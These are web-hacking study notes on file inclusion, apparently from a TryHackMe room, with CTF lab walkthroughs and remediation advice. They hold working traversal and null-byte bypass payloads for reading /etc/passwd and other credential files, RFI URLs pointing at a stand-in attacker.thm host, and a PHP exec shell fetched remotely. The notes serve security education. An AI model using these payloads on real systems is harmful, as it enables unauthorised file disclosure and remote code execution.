---
layout: default
title: File Inclusion
parent: Introduction to Web Hacking
nav_order: 6
---

# File Inclusion
- **Local File Inclusion (LFI)**
- **Remote File Inclusion (RFI)**
- **Path/Directory Traversal**

URL Diagram
![url diagram](imgs/URL-Diagram.png)
**The GET requests pass user input into the search engine**
- `https://www.google.com/search?q=TryHackMe`

**A user requests to access files from a webserver**
1. The user sends an HTTP request to the webserver that includes a file to display.
- `http://webapp.thm/get.php?file=userCV.pdf`
    - **parameter**, `file`
    - **File to access**, `userCV.pdf`

![userCV.pdf](imgs/userCV-pdf.png)

**Why do File inclusion vulnerabilities happen?**
Input validation, the user inputs are not sanitized or validated, and the user controls them.

**What is the risk of File inclusion?**
- Leak data, code, credentials, or other important files related to the web application or operating system.
- If the attacker can write files to the server, might be used in tandem to gain **Remote Command Execution (RCE)**.

## Path/Directory Traversal
- A web security vulnerability allows an attacker to read operating system resources, 
- When the user's input is passed to a function such as `file_get_contents` in PHP. To read the content of a file.

![/var/www/app/](imgs/var-www-app.png)

**Path traversal attacks**
- **dot-dot-slash**, Take advantage of moving the directory one step up using the double dots `../`.
    1. The user finds, `get.php?file=`
    1. The user needs `/etc/passwd`
    1. The web application stores content at, `/var/www/app`
    1. With this information, 
        - `/var/www/app`
        - `../../../../`, This goes to the root dir
    1. The user gets the `passwd` file with, `http://webapp.thm/get.php?file=../../../../etc/passwd`
    - `C:\boot.ini`
        - `http://webapp.thm/get.php?file=../../../../boot.ini`
    - `C:\windows\win.ini`
        - `http://webapp.thm/get.php?file=../../../../windows/win.ini`

![/etc/passwd](imgs/etc-passwd.png)

**Common OS files**
|||
|--|---|
|`/etc/issue`||
|`/etc/profile`||
|`/proc/version`||
|`/etc/passwd`||
|`/etc/shadow`||
|`/root/.bash_history`||
|`/var/log/dmessage`||
|`/var/mail/root`||
|`/root/.ssh/id_rsa`||
|`/var/log/apache2/access.log`||
|`C:\boot.ini`||

## Local File Inclusion (LFI)
**PHP functions**
- `include`
- `require`
- `include_once`
- `require_once`

**Other languages**
- **ASP**
- **JSP**
- **Node.js apps**

### Example 1
```diff
-There isn't a directory specified in the include function and no input validation.
```
The web application provides two languages, `EN` & `FR`, The user can select between them.
```php
<?PHP 
	include($_GET["lang"]);
?>
```
- `GET` request, The URL parameter lang to include the file of the page.
- `http://webapp.thm/index.php?lang=EN.php`, To load the English page.
- `http://webapp.thm/index.php?lang=FR.php`, To load the French page.
    - Where the `En.php` and `FR.php` files exist in the same directory.
- `http://webapp.thm/get.php?file=/etc/passwd`, To read the `/etc/passwd` file.

### Example 2
```diff
-
```
Update: The developer decided to specify the directory inside the function.

The developer decided to use the `include` function to call PHP pages in the `languages` directory only `lang` parameters.
```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```
**No input validation**
- The attacker can manipulate the URL by replacing the `lang` input with `/etc/passwd` file.
    - `http://webapp.thm/index.php?lang=../../../../etc/passwd`

### Example 3
- `http://webapp.thm/index.php?lang=EN`, Valid input
- `http://webapp.thm/index.php?lang=THM`, Invalid input
    ```diff
    +Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
    ```
    - `include(languages/thm.php);`, 
    - `index.php?lang=EN`, The file `EN,php` located `languages` directory.
    - `/var/www/html/THM-4/`, The full web application directory path.
- `http://webapp.thm/index.php?lang=../../../../etc/passwd`
    - 4 `../`, The path has four levels `/var/www/html/THM-4`
        ```diff
        +Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
        ```
    - The include function reads the input with `.php`
    - The developer specifies the file type to pass to the include function.
    - To bypass this scenario, use the **NULL BYTE**: `%00`
- **URL-Encoded**
    - **NULL Byte %00**
        - Add the NULL Byte at the end of the payload.
        - Tells the include function to ignore anything after the NULL Byte.
            - `include("languages/../../../../../etc/passwd%00").".php");`
            - `include("languages/../../../../../etc/passwd");`
            ```diff
            -Note: the %00 trick is fixed and not working with PHP 5.3.4 and above.
            ```
### Example 4
The developer decided to filter keywords to avoid disclosing sensitive information.
- `/etc/passwd`, file

**Bypass the filter**
1. Using the **NullByte** `%00`
    - `http://webapp.thm/index.php?lang=/etc/passwd/`
    - `http://webapp.thm/index.php?lang=/etc/passwd%00`
1. The current directory trick at the end of the filtered keyword `/.`
    - `/etc/passwd/..` -> `/etc/`
    - `/etc/passwd/.` -> `/etc/passwd`
### Example 5
The developer starts to use input validation by filtering some keywords.
- `http://webapp.thm/index.php?lang=../../../../etc/passwd`
    ```diff
    Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
    ```
    - `include(languages/etc/passwd)`, The web application replaces the `../` with the empty string.
- `...//....//....//....//....//etc/passwd`
    - The PHP filter only matches and replaces the first subset string `../` it finds.
    - ..`../`/..`../`/..`../`/..`../`/..`../`/etc/passwd
    - `../../../../etc/passwd`
### Example 6
The developer forces the include to read from a defined directory, `languages`.
- `http://webapp.thm/index.php?lang=languages/EN.php`
- `lang=languages/../../../../../etc/passwd`

## Remote File Inclusion (RFI)
- Occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into `include` function. 
- One requirement for RFI is that the `allow_url_fopen` option needs to be `on`.
- **Remote Command Execution (RCE)**
- **Sensitive Information Disclosure**
- **Cross-site Scripting (XSS)**
- **Denial of Service (DOS)**

1. `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`
    - The attacker injects the malicious URL.
    - If there is no input validation, then the malicious URL passes into the include function.
1. `http://attacker.thm/cmd.txt`
    - The web app server will send a GET request to the malicious server to fetch the file.
1. `http://attacker.thm/cmd.txt`
1. `cmd.txt`
    - The web app includes the remote file into include function to execute the php file within the page.
1. `get.php`
    - Send the execution content to the attacker.
    - The current page somewhere has to show the `Hello THM` message.

![RFI](imgs/RFI.png)

## Remediation
- Keep system and services updated with the latest version.
- Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
- A Web Application Firewall (WAF) to help mitigate web application attacks.
- Disable some PHP features, `allow_url_fopen` & `allow_url_include`
- Implement proper input validation against file inclusion.
- Whitelisting for file names and locations
- Blacklisting

## Questions!
### Q 1
Lab #1
- URL, `http://10.81.164.109/lab1.php`
- Input bar, `For example: welcome.php`
    - Type, `welcome.php`
- From the Network tab, `http://10.81.164.109/lab1.php?file=welcome.php`
- `http://10.81.164.109/lab1.php?file=/etc/passwd`
- `http://10.81.164.109/lab1.php?file=welcome.php`

### Q 2
Lab #2
- URL, `http://10.81.164.109/lab2.php`
- Input bar, `For example: welcome.php`
    - Type, `Break This PHP Code!`
        ```diff
        File Content Preview of Break This PHP Code!

        +Warning: include(includes/Break This PHP Code!) [function.include]: failed to open stream: No such file or directory in /var/www/html/lab2.php on line 26

        Warning: include() [function.include]: Failed opening 'includes/Break This PHP Code!' for inclusion (include_path='.:/usr/lib/php5.2/lib/php') in /var/www/html/lab2.php on line 26
        ```

## Challenge
### Flag 1
Note:  The input form is broken! You need to send `POST` request with `file` parameter! 
1. Chnage the form method from `GET` to `POST`
1. `../../../../etc/flag1`

### Flag 2
1. Edit the cookies, `Storage`
1. Edit value, `Admin`
1. Edit the value to, `../../../../etc/flag2%00"`

### Flag 3
1. `curl -X POST http://10.82.174.29/challenges/chall3.php -d 'method=POST&file=../../../../etc/flag3%00' --output -`

### Lab 
`php_shell.txt`
```php
<?PHP
print exec('hostname');
?>
```
`python3 -m http.server 8000`

`http://10.82.174.29/playground.php?file=http://<THM_IP_Address>:8000/php_shell.txt`